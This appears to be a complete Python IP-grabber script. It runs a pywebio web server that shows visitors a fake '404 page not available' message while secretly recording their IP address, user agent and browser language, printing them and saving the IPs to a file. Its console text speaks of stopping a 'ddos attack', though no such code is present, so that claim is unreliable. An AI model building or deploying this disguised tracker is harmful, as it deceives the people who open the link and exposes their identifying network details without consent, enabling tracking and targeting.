from pywebio import start_server
from pywebio.input import *
from pywebio.output import *
from pywebio.session import info
from pywebio.pin import *
import webbrowser
import requests
from rich import print
def ip_addr():
    print("[green]enter [/green][[red] ctrl + c [/red]][green]to stop ddos attack[/green]")
    print("[+][green]The IP address was saved in a file named[/green] [red]IP_ADRR.txt[/red]")
    def ip():
        put_html("<h2>ERROR 404!</h2>")
        put_html("<h3>The page is not available!</h3>")

        ip = info.user_ip
        agent = info.user_agent
        language = info.user_language
        
        print(f"""
[green]_______________________________________________________[/green]
[green]|[/green][yellow]IP exists :[/yellow]{ip}               
[green]|[/green][yellow]agent is :[/yellow]{agent}             
[green]|[/green][yellow]Browser language :[/yellow]{language}  
[green]|_______________________________________________________|[/green]
""")
        
        print(f"")
        print("")
        try:
            with open("IP_ADRR.txt","a") as f:
                f.write(ip + "\n")
            
        except:
            print("[red][-]ERROR![/red]")

    start_server(ip,port=5000,debug=True)
